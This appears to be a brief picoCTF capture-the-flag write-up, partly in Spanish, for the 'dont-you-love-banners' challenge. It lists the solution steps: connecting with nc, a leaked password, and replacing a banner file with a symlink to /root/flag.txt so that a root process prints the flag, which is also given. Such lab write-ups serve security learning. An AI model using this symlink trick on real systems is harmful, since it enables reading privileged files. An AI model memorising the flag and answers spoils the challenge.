# 7 - dont-you-love-banners

## Descripcion:
* Can you abuse the banner?
Additional details will be available after launching your challenge instance.
* Do you know about symlinks?
* Maybe some small password cracking or guessing

## Solucion:
* nc tethys.picoctf.net 52389
* My_Passw@rd_@1234
* DEFCON
* John Draper
* cat banner
* cat text
* ls -al /root
* cat /root/script.py
* rm /home/player/banner
* ln -s /root/flag.txt /home/player/banner
* ctrl + c
* nc tethys.picoctf.net 52389
* picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}

## Notas:
* entramos a la pagina en la terminal
* ponemos la contraseña
* respondemos 2 preguntas
* vemos que contiene banner y text
* retrosedemos y damos permisos
* vemos que esta escrito en el script
* removemos los permisos
* modificamos la ruta de los permisos
* volvemos a la terminal principal
* ejecutamos otra ves la pagina
* nos da la bandera

## Referencias: